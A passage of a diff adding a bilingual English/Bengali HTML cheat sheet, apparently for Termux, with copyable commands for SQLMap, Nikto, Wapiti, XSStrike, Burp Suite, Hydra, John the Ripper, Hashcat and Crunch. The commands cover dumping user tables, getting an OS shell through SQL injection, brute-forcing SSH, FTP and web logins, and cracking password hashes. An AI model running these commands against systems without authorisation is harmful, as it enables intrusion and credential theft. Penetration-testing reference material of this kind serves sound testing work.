+        <div class="sec-title bn">ওয়েব সিকিউরিটি টেস্টিং</div>
+        <div class="sec-sub en">Find & test SQLi, XSS, misconfigs & web vulnerabilities</div>
+        <div class="sec-sub bn">SQLi, XSS, মিসকনফিগ ও ওয়েব ভালনারেবিলিটি খুঁজুন ও টেস্ট করুন</div>
+      </div>
+      <div class="sec-count">5 TOOLS</div>
+    </div>
+    <div class="grid">
+
+      <!-- SQLMAP -->
+      <div class="card" data-cat="web" data-kw="sqlmap sql injection database dump exploit">
+        <div class="card-top">
+          <div class="tool-icon" style="background:#1a0a00;border:1px solid var(--orange);">🗄️</div>
+          <div class="tool-meta">
+            <div class="tool-name">SQLMap</div>
+            <div class="tool-desc en">Automatic SQL injection detection & database exploitation</div>
+            <div class="tool-desc bn">অটোমেটিক SQL ইনজেকশন ডিটেকশন ও ডেটাবেস এক্সপ্লয়েটেশন</div>
+          </div>
+          <span class="badge b-web">WEB</span>
+        </div>
+        <div class="features">
+          <div class="feat-title en">✦ What you can do with SQLMap</div>
+          <div class="feat-title bn">✦ SQLMap দিয়ে যা করতে পারবেন</div>
+          <div class="feat-list">
+            <span class="feat en">SQLi Detection</span><span class="feat bn">SQLi ডিটেকশন</span>
+            <span class="feat en">DB Enumeration</span><span class="feat bn">DB এনুমারেশন</span>
+            <span class="feat en">Table/Data Dump</span><span class="feat bn">টেবিল/ডেটা ডাম্প</span>
+            <span class="feat en">OS Shell Access</span><span class="feat bn">OS শেল অ্যাক্সেস</span>
+            <span class="feat en">WAF Bypass</span><span class="feat bn">WAF বাইপাস</span>
+            <span class="feat en">Blind SQLi</span><span class="feat bn">ব্লাইন্ড SQLi</span>
+          </div>
+        </div>
+        <div class="inst">
+          <code><span style="color:var(--cyan)">pkg</span> install <span style="color:var(--orange)">sqlmap</span></code>
+          <button class="cpbtn" onclick="cp(this,'pkg install sqlmap')">COPY</button>
+        </div>
+        <div class="cmds">
+          <div class="cmd-lbl">COMMANDS</div>
+          <div class="cmd-row"><div class="cmd-content">
+            <div class="cmd-code"><span class="cb">sqlmap</span> <span class="cf">-u</span> <span class="cs">"http://site.com/page?id=1"</span> <span class="cf">--dbs</span></div>
+            <div class="cmd-note en">Test URL for SQLi and list all databases</div>
+            <div class="cmd-note bn">URL-এ SQLi টেস্ট করে সব ডেটাবেস দেখুন</div>
+          </div><button class="cpbtn" onclick="cp(this,'sqlmap -u \"http://site.com/page?id=1\" --dbs')">COPY</button></div>
+          <div class="cmd-row"><div class="cmd-content">
+            <div class="cmd-code"><span class="cb">sqlmap</span> <span class="cf">-u</span> <span class="cs">"url"</span> <span class="cf">-D</span> <span class="ca">dbname</span> <span class="cf">--tables</span></div>
+            <div class="cmd-note en">List all tables inside a specific database</div>
+            <div class="cmd-note bn">নির্দিষ্ট ডেটাবেসের সব টেবিল দেখুন</div>
+          </div><button class="cpbtn" onclick="cp(this,'sqlmap -u \"url\" -D dbname --tables')">COPY</button></div>
+          <div class="cmd-row"><div class="cmd-content">
+            <div class="cmd-code"><span class="cb">sqlmap</span> <span class="cf">-u</span> <span class="cs">"url"</span> <span class="cf">-D</span> db <span class="cf">-T</span> users <span class="cf">--dump</span></div>
+            <div class="cmd-note en">Dump all data from the users table (passwords, emails)</div>
+            <div class="cmd-note bn">users টেবিলের সব ডেটা ডাম্প করুন (পাসওয়ার্ড, ইমেইল)</div>
+          </div><button class="cpbtn" onclick="cp(this,'sqlmap -u \"url\" -D db -T users --dump')">COPY</button></div>
+          <div class="cmd-row"><div class="cmd-content">
+            <div class="cmd-code"><span class="cb">sqlmap</span> <span class="cf">-u</span> <span class="cs">"url"</span> <span class="cf">--os-shell</span></div>
+            <div class="cmd-note en">Get OS shell access through SQLi vulnerability</div>
+            <div class="cmd-note bn">SQLi-এর মাধ্যমে OS শেল অ্যাক্সেস পান</div>
+          </div><button class="cpbtn" onclick="cp(this,'sqlmap -u \"url\" --os-shell')">COPY</button></div>
+        </div>
+      </div>
+
+      <!-- NIKTO -->
+      <div class="card" data-cat="web" data-kw="nikto web server scanner vulnerability">
+        <div class="card-top">
+          <div class="tool-icon" style="background:#1a0a00;border:1px solid var(--orange);">🔍</div>
+          <div class="tool-meta">
+            <div class="tool-name">Nikto</div>
+            <div class="tool-desc en">Web server vulnerability scanner — 6700+ known issues</div>
+            <div class="tool-desc bn">ওয়েব সার্ভার ভালনারেবিলিটি স্ক্যানার — ৬৭০০+ পরিচিত সমস্যা</div>
+          </div>
+          <span class="badge b-web">WEB</span>
+        </div>
+        <div class="features">
+          <div class="feat-title en">✦ What you can do with Nikto</div>
+          <div class="feat-title bn">✦ Nikto দিয়ে যা করতে পারবেন</div>
+          <div class="feat-list">
+            <span class="feat en">6700+ Vuln Check</span><span class="feat bn">৬৭০০+ ভালনারেবিলিটি</span>
+            <span class="feat en">SSL/TLS Testing</span><span class="feat bn">SSL/TLS টেস্টিং</span>
+            <span class="feat en">HTTP Header Analysis</span><span class="feat bn">HTTP হেডার বিশ্লেষণ</span>
+            <span class="feat en">Default Files Check</span><span class="feat bn">ডিফল্ট ফাইল চেক</span>
+            <span class="feat en">HTML/CSV Report</span><span class="feat bn">HTML/CSV রিপোর্ট</span>
+          </div>
+        </div>
+        <div class="inst">
+          <code><span style="color:var(--cyan)">pkg</span> install <span style="color:var(--orange)">nikto</span></code>
+          <button class="cpbtn" onclick="cp(this,'pkg install nikto')">COPY</button>
+        </div>
+        <div class="cmds">
+          <div class="cmd-lbl">COMMANDS</div>
+          <div class="cmd-row"><div class="cmd-content">
+            <div class="cmd-code"><span class="cb">nikto</span> <span class="cf">-h</span> <span class="ca">http://target.com</span></div>
+            <div class="cmd-note en">Full vulnerability scan of a web server</div>
+            <div class="cmd-note bn">ওয়েব সার্ভারের ফুল ভালনারেবিলিটি স্ক্যান</div>
+          </div><button class="cpbtn" onclick="cp(this,'nikto -h http://target.com')">COPY</button></div>
+          <div class="cmd-row"><div class="cmd-content">
+            <div class="cmd-code"><span class="cb">nikto</span> <span class="cf">-h</span> <span class="ca">target</span> <span class="cf">-o</span> report.html <span class="cf">-Format</span> html</div>
+            <div class="cmd-note en">Save scan results as HTML report</div>
+            <div class="cmd-note bn">স্ক্যান রেজাল্ট HTML রিপোর্টে সেভ করুন</div>
+          </div><button class="cpbtn" onclick="cp(this,'nikto -h target -o report.html -Format html')">COPY</button></div>
+          <div class="cmd-row"><div class="cmd-content">
+            <div class="cmd-code"><span class="cb">nikto</span> <span class="cf">-h</span> <span class="ca">https://target.com</span> <span class="cf">-ssl</span></div>
+            <div class="cmd-note en">Scan HTTPS site with SSL certificate check</div>
+            <div class="cmd-note bn">SSL সার্টিফিকেট চেকসহ HTTPS সাইট স্ক্যান</div>
+          </div><button class="cpbtn" onclick="cp(this,'nikto -h https://target.com -ssl')">COPY</button></div>
+        </div>
+      </div>
+
+      <!-- WAPITI -->
+      <div class="card" data-cat="web" data-kw="wapiti web application scanner xss sql fuzzer">
+        <div class="card-top">
+          <div class="tool-icon" style="background:#1a0a00;border:1px solid var(--orange);">🕷️</div>
+          <div class="tool-meta">
+            <div class="tool-name">Wapiti</div>
+            <div class="tool-desc en">Web app vulnerability scanner — crawl & fuzz parameters</div>
+            <div class="tool-desc bn">ওয়েব অ্যাপ স্ক্যানার — ক্রল ও প্যারামিটার ফাজ করুন</div>
+          </div>
+          <span class="badge b-web">WEB</span>
+        </div>
+        <div class="features">
+          <div class="feat-title en">✦ What you can do with Wapiti</div>
+          <div class="feat-title bn">✦ Wapiti দিয়ে যা করতে পারবেন</div>
+          <div class="feat-list">
+            <span class="feat en">XSS Detection</span><span class="feat bn">XSS ডিটেকশন</span>
+            <span class="feat en">SQLi Scanning</span><span class="feat bn">SQLi স্ক্যানিং</span>
+            <span class="feat en">CSRF Detection</span><span class="feat bn">CSRF ডিটেকশন</span>
+            <span class="feat en">File Inclusion</span><span class="feat bn">ফাইল ইনক্লুশন</span>
+            <span class="feat en">Full Site Crawl</span><span class="feat bn">ফুল সাইট ক্রল</span>
+          </div>
+        </div>
+        <div class="inst">
+          <code>pip install wapiti3</code>
+          <button class="cpbtn" onclick="cp(this,'pip install wapiti3')">COPY</button>
+        </div>
+        <div class="cmds">
+          <div class="cmd-lbl">COMMANDS</div>
+          <div class="cmd-row"><div class="cmd-content">
+            <div class="cmd-code"><span class="cb">wapiti</span> <span class="cf">-u</span> <span class="ca">http://target.com</span></div>
+            <div class="cmd-note en">Full scan of web app for all vulnerabilities</div>
+            <div class="cmd-note bn">ওয়েব অ্যাপের সব ভালনারেবিলিটির ফুল স্ক্যান</div>
+          </div><button class="cpbtn" onclick="cp(this,'wapiti -u http://target.com')">COPY</button></div>
+          <div class="cmd-row"><div class="cmd-content">
+            <div class="cmd-code"><span class="cb">wapiti</span> <span class="cf">-u</span> <span class="ca">http://target.com</span> <span class="cf">-m</span> xss,sql <span class="cf">-f</span> html <span class="cf">-o</span> report</div>
+            <div class="cmd-note en">Scan only XSS & SQL, save HTML report</div>
+            <div class="cmd-note bn">শুধু XSS ও SQL স্ক্যান, HTML রিপোর্ট সেভ</div>
+          </div><button class="cpbtn" onclick="cp(this,'wapiti -u http://target.com -m xss,sql -f html -o report')">COPY</button></div>
+        </div>
+      </div>
+
+      <!-- XSSTRIKE -->
+      <div class="card" data-cat="web" data-kw="xsstrike xss cross site scripting payload">
+        <div class="card-top">
+          <div class="tool-icon" style="background:#1a0a00;border:1px solid var(--orange);">⚡</div>
+          <div class="tool-meta">
+            <div class="tool-name">XSStrike</div>
+            <div class="tool-desc en">Advanced XSS detection, fuzzing & exploitation suite</div>
+            <div class="tool-desc bn">এডভান্সড XSS ডিটেকশন, ফাজিং ও এক্সপ্লয়েটেশন স্যুট</div>
+          </div>
+          <span class="badge b-web">WEB</span>
+        </div>
+        <div class="features">
+          <div class="feat-title en">✦ What you can do with XSStrike</div>
+          <div class="feat-title bn">✦ XSStrike দিয়ে যা করতে পারবেন</div>
+          <div class="feat-list">
+            <span class="feat en">XSS Payload Fuzzing</span><span class="feat bn">XSS পেলোড ফাজিং</span>
+            <span class="feat en">WAF Detection/Bypass</span><span class="feat bn">WAF ডিটেক্ট/বাইপাস</span>
+            <span class="feat en">DOM XSS</span><span class="feat bn">DOM XSS</span>
+            <span class="feat en">Reflected XSS</span><span class="feat bn">রিফ্লেক্টেড XSS</span>
+            <span class="feat en">Full Site Crawl</span><span class="feat bn">ফুল সাইট ক্রল</span>
+          </div>
+        </div>
+        <div class="inst">
+          <code>git clone https://github.com/s0md3v/XSStrike && cd XSStrike && pip install -r requirements.txt</code>
+          <button class="cpbtn" onclick="cp(this,'git clone https://github.com/s0md3v/XSStrike && cd XSStrike && pip install -r requirements.txt')">COPY</button>
+        </div>
+        <div class="cmds">
+          <div class="cmd-lbl">COMMANDS</div>
+          <div class="cmd-row"><div class="cmd-content">
+            <div class="cmd-code"><span class="cb">python3</span> xsstrike.py <span class="cf">-u</span> <span class="cs">"http://site.com/page?q=test"</span></div>
+            <div class="cmd-note en">Scan URL parameter for XSS vulnerabilities</div>
+            <div class="cmd-note bn">URL প্যারামিটারে XSS ভালনারেবিলিটি স্ক্যান করুন</div>
+          </div><button class="cpbtn" onclick="cp(this,'python3 xsstrike.py -u \"http://site.com/page?q=test\"')">COPY</button></div>
+          <div class="cmd-row"><div class="cmd-content">
+            <div class="cmd-code"><span class="cb">python3</span> xsstrike.py <span class="cf">-u</span> <span class="cs">"http://site.com"</span> <span class="cf">--crawl</span></div>
+            <div class="cmd-note en">Crawl entire website and find all XSS points</div>
+            <div class="cmd-note bn">পুরো ওয়েবসাইট ক্রল করে সব XSS পয়েন্ট খুঁজুন</div>
+          </div><button class="cpbtn" onclick="cp(this,'python3 xsstrike.py -u \"http://site.com\" --crawl')">COPY</button></div>
+        </div>
+      </div>
+
+      <!-- BURP SUITE -->
+      <div class="card" data-cat="web" data-kw="burp suite proxy intercept http web testing gui">
+        <div class="card-top">
+          <div class="tool-icon" style="background:#1a0a00;border:1px solid var(--orange);">🦊</div>
+          <div class="tool-meta">
+            <div class="tool-name">Burp Suite</div>
+            <div class="tool-desc en">Web proxy — intercept, modify & replay HTTP/S requests (needs VNC)</div>
+            <div class="tool-desc bn">ওয়েব প্রক্সি — HTTP/S রিকোয়েস্ট ইন্টারসেপ্ট, মডিফাই ও রিপ্লে (VNC লাগে)</div>
+          </div>
+          <span class="badge b-web">WEB</span>
+        </div>
+        <div class="features">
+          <div class="feat-title en">✦ What you can do with Burp Suite</div>
+          <div class="feat-title bn">✦ Burp Suite দিয়ে যা করতে পারবেন</div>
+          <div class="feat-list">
+            <span class="feat en">HTTP Intercept</span><span class="feat bn">HTTP ইন্টারসেপ্ট</span>
+            <span class="feat en">Request Repeater</span><span class="feat bn">রিকোয়েস্ট রিপিটার</span>
+            <span class="feat en">Intruder (Fuzzer)</span><span class="feat bn">ইন্ট্রুডার ফাজার</span>
+            <span class="feat en">Spider/Crawler</span><span class="feat bn">স্পাইডার/ক্রলার</span>
+            <span class="feat en">Decoder/Encoder</span><span class="feat bn">ডিকোডার/এনকোডার</span>
+          </div>
+        </div>
+        <div class="inst">
+          <code><span style="color:var(--cyan)">pkg</span> install <span style="color:var(--orange)">x11-repo</span> && <span style="color:var(--cyan)">pkg</span> install <span style="color:var(--orange)">tigervnc openjdk-17</span> && wget https://portswigger.net/burp (Download community JAR)</code>
+          <button class="cpbtn" onclick="cp(this,'pkg install x11-repo && pkg install tigervnc openjdk-17')">COPY</button>
+        </div>
+        <div class="cmds">
+          <div class="cmd-lbl">VNC SETUP FIRST</div>
+          <div class="cmd-row"><div class="cmd-content">
+            <div class="cmd-code"><span class="cb">vncserver</span> <span class="cf">-localhost no</span></div>
+            <div class="cmd-note en">Start VNC server → connect via VNC viewer app then run Burp</div>
+            <div class="cmd-note bn">VNC সার্ভার শুরু করুন → VNC viewer অ্যাপে কানেক্ট করে Burp চালান</div>
+          </div><button class="cpbtn" onclick="cp(this,'vncserver -localhost no')">COPY</button></div>
+          <div class="cmd-row"><div class="cmd-content">
+            <div class="cmd-code"><span class="cb">DISPLAY=:1 java</span> <span class="cf">-jar</span> <span class="ca">burpsuite_community.jar</span></div>
+            <div class="cmd-note en">Launch Burp Suite GUI via VNC display</div>
+            <div class="cmd-note bn">VNC ডিসপ্লেতে Burp Suite GUI চালু করুন</div>
+          </div><button class="cpbtn" onclick="cp(this,'DISPLAY=:1 java -jar burpsuite_community.jar')">COPY</button></div>
+        </div>
+      </div>
+
+    </div>
+  </div>
+
+  <!-- ════════════════════════════════════════
+       4. PASSWORD / HASH TESTING
+  ════════════════════════════════════════ -->
+  <div class="sec" data-section="password">
+    <div class="sec-head">
+      <div class="sec-icon">🔑</div>
+      <div>
+        <div class="sec-title en">Password / Hash Testing</div>
+        <div class="sec-title bn">পাসওয়ার্ড / হ্যাশ টেস্টিং</div>
+        <div class="sec-sub en">Brute-force logins, crack hashes & generate wordlists</div>
+        <div class="sec-sub bn">লগিন ব্রুটফোর্স, হ্যাশ ক্র্যাক ও ওয়ার্ডলিস্ট তৈরি</div>
+      </div>
+      <div class="sec-count">4 TOOLS</div>
+    </div>
+    <div class="grid">
+
+      <!-- HYDRA -->
+      <div class="card" data-cat="password" data-kw="hydra brute force login ssh ftp http password">
+        <div class="card-top">
+          <div class="tool-icon" style="background:#1a0000;border:1px solid var(--red);">🔐</div>
+          <div class="tool-meta">
+            <div class="tool-name">Hydra</div>
+            <div class="tool-desc en">Fast multi-protocol network login brute-forcer (50+ protocols)</div>
+            <div class="tool-desc bn">দ্রুত মাল্টি-প্রোটোকল নেটওয়ার্ক লগিন ব্রুটফোর্সার (৫০+ প্রোটোকল)</div>
+          </div>
+          <span class="badge b-pass">PASSWORD</span>
+        </div>
+        <div class="features">
+          <div class="feat-title en">✦ What you can do with Hydra</div>
+          <div class="feat-title bn">✦ Hydra দিয়ে যা করতে পারবেন</div>
+          <div class="feat-list">
+            <span class="feat en">SSH/FTP Attack</span><span class="feat bn">SSH/FTP আক্রমণ</span>
+            <span class="feat en">HTTP Form Attack</span><span class="feat bn">HTTP ফর্ম আক্রমণ</span>
+            <span class="feat en">Wordlist Attack</span><span class="feat bn">ওয়ার্ডলিস্ট আক্রমণ</span>
+            <span class="feat en">Multi-threaded</span><span class="feat bn">মাল্টি-থ্রেড</span>
+            <span class="feat en">Resume Attack</span><span class="feat bn">আক্রমণ পুনরায় শুরু</span>
+          </div>
+        </div>
+        <div class="inst">
+          <code><span style="color:var(--cyan)">pkg</span> install <span style="color:var(--orange)">hydra</span></code>
+          <button class="cpbtn" onclick="cp(this,'pkg install hydra')">COPY</button>
+        </div>
+        <div class="cmds">
+          <div class="cmd-lbl">COMMANDS</div>
+          <div class="cmd-row"><div class="cmd-content">
+            <div class="cmd-code"><span class="cb">hydra</span> <span class="cf">-l</span> admin <span class="cf">-P</span> wordlist.txt <span class="ca">ssh://192.168.1.1</span></div>
+            <div class="cmd-note en">SSH brute-force with fixed username 'admin'</div>
+            <div class="cmd-note bn">নির্দিষ্ট ইউজারনেম 'admin' দিয়ে SSH ব্রুটফোর্স</div>
+          </div><button class="cpbtn" onclick="cp(this,'hydra -l admin -P wordlist.txt ssh://192.168.1.1')">COPY</button></div>
+          <div class="cmd-row"><div class="cmd-content">
+            <div class="cmd-code"><span class="cb">hydra</span> <span class="cf">-L</span> users.txt <span class="cf">-P</span> pass.txt <span class="ca">ftp://192.168.1.1</span></div>
+            <div class="cmd-note en">FTP brute-force with user list and password list</div>
+            <div class="cmd-note bn">ইউজার লিস্ট ও পাসওয়ার্ড লিস্ট দিয়ে FTP ব্রুটফোর্স</div>
+          </div><button class="cpbtn" onclick="cp(this,'hydra -L users.txt -P pass.txt ftp://192.168.1.1')">COPY</button></div>
+          <div class="cmd-row"><div class="cmd-content">
+            <div class="cmd-code"><span class="cb">hydra</span> <span class="cf">-l</span> admin <span class="cf">-P</span> pass.txt <span class="ca">192.168.1.1</span> http-post-form <span class="cs">"/login:user=^USER^&pass=^PASS^:F=wrong"</span></div>
+            <div class="cmd-note en">HTTP form login brute-force attack</div>
+            <div class="cmd-note bn">HTTP ফর্ম লগিন ব্রুটফোর্স আক্রমণ</div>
+          </div><button class="cpbtn" onclick="cp(this,'hydra -l admin -P pass.txt 192.168.1.1 http-post-form \"/login:user=^USER^&pass=^PASS^:F=wrong\"')">COPY</button></div>
+          <div class="cmd-row"><div class="cmd-content">
+            <div class="cmd-code"><span class="cb">hydra</span> <span class="cf">-l</span> admin <span class="cf">-P</span> pass.txt <span class="cf">-t 64 -vV</span> <span class="ca">ssh://target</span></div>
+            <div class="cmd-note en">64 threads, verbose output — faster attack</div>
+            <div class="cmd-note bn">৬৪ থ্রেড, ভার্বোস আউটপুট — দ্রুত আক্রমণ</div>
+          </div><button class="cpbtn" onclick="cp(this,'hydra -l admin -P pass.txt -t 64 -vV ssh://target')">COPY</button></div>
+        </div>
+      </div>
+
+      <!-- JOHN THE RIPPER -->
+      <div class="card" data-cat="password" data-kw="john ripper hash crack offline md5 sha">
+        <div class="card-top">
+          <div class="tool-icon" style="background:#1a0000;border:1px solid var(--red);">💀</div>
+          <div class="tool-meta">
+            <div class="tool-name">John The Ripper</div>
+            <div class="tool-desc en">Offline password hash cracker — auto-detects hash type</div>
+            <div class="tool-desc bn">অফলাইন পাসওয়ার্ড হ্যাশ ক্র্যাকার — অটো হ্যাশ টাইপ ডিটেক্ট</div>
+          </div>
+          <span class="badge b-pass">PASSWORD</span>
+        </div>
+        <div class="features">
+          <div class="feat-title en">✦ What you can do with John The Ripper</div>
+          <div class="feat-title bn">✦ John দিয়ে যা করতে পারবেন</div>
+          <div class="feat-list">
+            <span class="feat en">Auto Hash Detection</span><span class="feat bn">অটো হ্যাশ ডিটেকশন</span>
+            <span class="feat en">MD5/SHA/NTLM</span><span class="feat bn">MD5/SHA/NTLM ক্র্যাক</span>
+            <span class="feat en">Wordlist Mode</span><span class="feat bn">ওয়ার্ডলিস্ট মোড</span>
+            <span class="feat en">Shadow File Crack</span><span class="feat bn">শ্যাডো ফাইল ক্র্যাক</span>
+            <span class="feat en">Rules/Mangling</span><span class="feat bn">রুলস/ম্যাংলিং</span>
+          </div>
+        </div>
+        <div class="inst">
+          <code><span style="color:var(--cyan)">pkg</span> install <span style="color:var(--orange)">john</span></code>
+          <button class="cpbtn" onclick="cp(this,'pkg install john')">COPY</button>
+        </div>
+        <div class="cmds">
+          <div class="cmd-lbl">COMMANDS</div>
+          <div class="cmd-row"><div class="cmd-content">
+            <div class="cmd-code"><span class="cb">john</span> <span class="ca">hashes.txt</span></div>
+            <div class="cmd-note en">Auto-detect hash type and start cracking</div>
+            <div class="cmd-note bn">হ্যাশ টাইপ অটো-ডিটেক্ট করে ক্র্যাকিং শুরু করুন</div>
+          </div><button class="cpbtn" onclick="cp(this,'john hashes.txt')">COPY</button></div>
+          <div class="cmd-row"><div class="cmd-content">
+            <div class="cmd-code"><span class="cb">john</span> <span class="cf">--wordlist=</span>rockyou.txt <span class="ca">hashes.txt</span></div>
+            <div class="cmd-note en">Use rockyou.txt wordlist to crack hashes</div>
+            <div class="cmd-note bn">rockyou.txt ওয়ার্ডলিস্ট দিয়ে হ্যাশ ক্র্যাক করুন</div>
+          </div><button class="cpbtn" onclick="cp(this,'john --wordlist=rockyou.txt hashes.txt')">COPY</button></div>
+          <div class="cmd-row"><div class="cmd-content">
+            <div class="cmd-code"><span class="cb">john</span> <span class="cf">--show</span> <span class="ca">hashes.txt</span></div>
+            <div class="cmd-note en">Show all cracked passwords</div>
+            <div class="cmd-note bn">সব ক্র্যাক হওয়া পাসওয়ার্ড দেখুন</div>
+          </div><button class="cpbtn" onclick="cp(this,'john --show hashes.txt')">COPY</button></div>
+          <div class="cmd-row"><div class="cmd-content">
+            <div class="cmd-code"><span class="cb">john</span> <span class="cf">--format=md5crypt --wordlist=</span>rockyou.txt <span class="ca">hash.txt</span></div>
+            <div class="cmd-note en">Crack specific hash format (md5crypt/sha512/ntlm etc.)</div>
+            <div class="cmd-note bn">নির্দিষ্ট হ্যাশ ফরম্যাট ক্র্যাক করুন</div>
+          </div><button class="cpbtn" onclick="cp(this,'john --format=md5crypt --wordlist=rockyou.txt hash.txt')">COPY</button></div>
+        </div>
+      </div>
+
+      <!-- HASHCAT -->
+      <div class="card" data-cat="password" data-kw="hashcat gpu hash crack md5 sha256 ntlm fast">
+        <div class="card-top">
+          <div class="tool-icon" style="background:#1a0000;border:1px solid var(--red);">🔥</div>
+          <div class="tool-meta">
+            <div class="tool-name">Hashcat</div>
+            <div class="tool-desc en">World's fastest hash cracker — 300+ hash types supported</div>
+            <div class="tool-desc bn">বিশ্বের দ্রুততম হ্যাশ ক্র্যাকার — ৩০০+ হ্যাশ টাইপ</div>
+          </div>
+          <span class="badge b-pass">PASSWORD</span>
+        </div>
+        <div class="features">
+          <div class="feat-title en">✦ What you can do with Hashcat</div>
+          <div class="feat-title bn">✦ Hashcat দিয়ে যা করতে পারবেন</div>
+          <div class="feat-list">
+            <span class="feat en">300+ Hash Types</span><span class="feat bn">৩০০+ হ্যাশ টাইপ</span>
+            <span class="feat en">Dictionary Attack</span><span class="feat bn">ডিকশনারি আক্রমণ</span>
+            <span class="feat en">Brute-Force Mode</span><span class="feat bn">ব্রুটফোর্স মোড</span>
+            <span class="feat en">Rule-based Attack</span><span class="feat bn">নিয়ম-ভিত্তিক আক্রমণ</span>
+            <span class="feat en">Combination Attack</span><span class="feat bn">কম্বিনেশন আক্রমণ</span>
+          </div>
+        </div>
+        <div class="inst">
+          <code><span style="color:var(--cyan)">pkg</span> install <span style="color:var(--orange)">hashcat</span></code>
+          <button class="cpbtn" onclick="cp(this,'pkg install hashcat')">COPY</button>
+        </div>
+        <div class="cmds">
+          <div class="cmd-lbl">HASH TYPES: -m 0=MD5 | -m 100=SHA1 | -m 1000=NTLM | -m 1800=SHA512</div>
+          <div class="cmd-row"><div class="cmd-content">
+            <div class="cmd-code"><span class="cb">hashcat</span> <span class="cf">-m 0 -a 0</span> <span class="ca">hash.txt</span> rockyou.txt</div>
+            <div class="cmd-note en">Dictionary attack on MD5 hashes using rockyou</div>
+            <div class="cmd-note bn">rockyou দিয়ে MD5 হ্যাশে ডিকশনারি আক্রমণ</div>
+          </div><button class="cpbtn" onclick="cp(this,'hashcat -m 0 -a 0 hash.txt rockyou.txt')">COPY</button></div>
+          <div class="cmd-row"><div class="cmd-content">
+            <div class="cmd-code"><span class="cb">hashcat</span> <span class="cf">-m 1000 -a 3</span> <span class="ca">hash.txt</span> <span class="cs">?a?a?a?a?a?a</span></div>
+            <div class="cmd-note en">Brute-force NTLM — try all 6-char combinations</div>
+            <div class="cmd-note bn">NTLM ব্রুটফোর্স — সব ৬ অক্ষরের কম্বিনেশন চেষ্টা</div>
+          </div><button class="cpbtn" onclick="cp(this,'hashcat -m 1000 -a 3 hash.txt ?a?a?a?a?a?a')">COPY</button></div>
+          <div class="cmd-row"><div class="cmd-content">
+            <div class="cmd-code"><span class="cb">hashcat</span> <span class="cf">-m 0 -a 0</span> <span class="ca">hash.txt</span> rockyou.txt <span class="cf">--show</span></div>
+            <div class="cmd-note en">Show already cracked hashes from previous session</div>
+            <div class="cmd-note bn">আগের সেশনে ক্র্যাক হওয়া হ্যাশ দেখুন</div>
+          </div><button class="cpbtn" onclick="cp(this,'hashcat -m 0 -a 0 hash.txt rockyou.txt --show')">COPY</button></div>
+        </div>
+      </div>
+
+      <!-- CRUNCH -->
+      <div class="card" data-cat="password" data-kw="crunch wordlist generator custom pattern">
+        <div class="card-top">
+          <div class="tool-icon" style="background:#1a0000;border:1px solid var(--red);">📝</div>
+          <div class="tool-meta">
+            <div class="tool-name">Crunch</div>
+            <div class="tool-desc en">Custom wordlist generator — build targeted password lists</div>
+            <div class="tool-desc bn">কাস্টম ওয়ার্ডলিস্ট জেনারেটর — টার্গেটেড পাসওয়ার্ড লিস্ট তৈরি</div>
+          </div>
+          <span class="badge b-pass">PASSWORD</span>
+        </div>
+        <div class="features">
+          <div class="feat-title en">✦ What you can do with Crunch</div>
+          <div class="feat-title bn">✦ Crunch দিয়ে যা করতে পারবেন</div>
+          <div class="feat-list">
+            <span class="feat en">Custom Charset</span><span class="feat bn">কাস্টম ক্যারেক্টার সেট</span>
+            <span class="feat en">Length Control</span><span class="feat bn">দৈর্ঘ্য নিয়ন্ত্রণ</span>
+            <span class="feat en">Pattern-based List</span><span class="feat bn">প্যাটার্ন-ভিত্তিক লিস্ট</span>
+            <span class="feat en">Pipe to Hashcat</span><span class="feat bn">Hashcat-এ পাইপ করুন</span>
+          </div>
+        </div>
+        <div class="inst">
+          <code><span style="color:var(--cyan)">pkg</span> install <span style="color:var(--orange)">crunch</span></code>
+          <button class="cpbtn" onclick="cp(this,'pkg install crunch')">COPY</button>
+        </div>
+        <div class="cmds">
+          <div class="cmd-lbl">COMMANDS</div>
+          <div class="cmd-row"><div class="cmd-content">
+            <div class="cmd-code"><span class="cb">crunch</span> <span class="ca">6 8</span> <span class="cs">abcdef0123456789</span> <span class="cf">-o</span> wordlist.txt</div>
+            <div class="cmd-note en">Generate 6-8 char list from custom charset → save to file</div>
+            <div class="cmd-note bn">কাস্টম ক্যারেক্টার থেকে ৬-৮ অক্ষরের লিস্ট → ফাইলে সেভ</div>
+          </div><button class="cpbtn" onclick="cp(this,'crunch 6 8 abcdef0123456789 -o wordlist.txt')">COPY</button></div>
+          <div class="cmd-row"><div class="cmd-content">
+            <div class="cmd-code"><span class="cb">crunch</span> <span class="ca">8 8</span> <span class="cf">-t</span> <span class="cs">@@@@1234</span> <span class="cf">-o</span> list.txt</div>
+            <div class="cmd-note en">Pattern: 4 letters + "1234" fixed (e.g. pass1234, john1234)</div>
+            <div class="cmd-note bn">প্যাটার্ন: ৪ অক্ষর + "1234" স্থির (যেমন pass1234)</div>
+          </div><button class="cpbtn" onclick="cp(this,'crunch 8 8 -t @@@@1234 -o list.txt')">COPY</button></div>
+          <div class="cmd-row"><div class="cmd-content">
+            <div class="cmd-code"><span class="cb">crunch</span> <span class="ca">4 6</span> <span class="cs">0123456789</span> | <span class="cb">hashcat</span> <span class="cf">-m 0</span> hash.txt</div>
+            <div class="cmd-note en">Pipe wordlist directly to hashcat (no file needed)</div>
+            <div class="cmd-note bn">ওয়ার্ডলিস্ট সরাসরি hashcat-এ পাইপ করুন</div>
+          </div><button class="cpbtn" onclick="cp(this,'crunch 4 6 0123456789 | hashcat -m 0 hash.txt')">COPY</button></div>
+        </div>
+      </div>
+
+    </div>
+  </div>
+
+  <!-- ════════════════════════════════════════
+       5. EXPLOITATION FRAMEWORK
+  ════════════════════════════════════════ -->
+  <div class="sec" data-section="exploit">
+    <div class="sec-head">
+      <div class="sec-icon">💣</div>
+      <div>
+        <div class="sec-title en">Exploitation Framework</div>
+        <div class="sec-title bn">এক্সপ্লয়েটেশন ফ্রেমওয়ার্ক</div>
+        <div class="sec-sub en">Use known exploits on authorized vulnerable systems</div>
+        <div class="sec-sub bn">অনুমোদিত ভালনারেবল সিস্টেমে পরিচিত এক্সপ্লয়েট ব্যবহার করুন</div>
+      </div>
+      <div class="sec-count">3 TOOLS</div>
+    </div>
+    <div class="grid">
+
+      <!-- METASPLOIT -->
+      <div class="card" data-cat="exploit" data-kw="metasploit msfconsole msfvenom payload exploit penetration">
+        <div class="card-top">
+          <div class="tool-icon" style="background:#1a0010;border:1px solid #ff6688;">🛡️</div>
+          <div class="tool-meta">
+            <div class="tool-name">Metasploit Framework</div>
+            <div class="tool-desc en">World's most used penetration testing & exploitation platform</div>
+            <div class="tool-desc bn">বিশ্বের সবচেয়ে বেশি ব্যবহৃত পেনিট্রেশন টেস্টিং প্ল্যাটফর্ম</div>
+          </div>
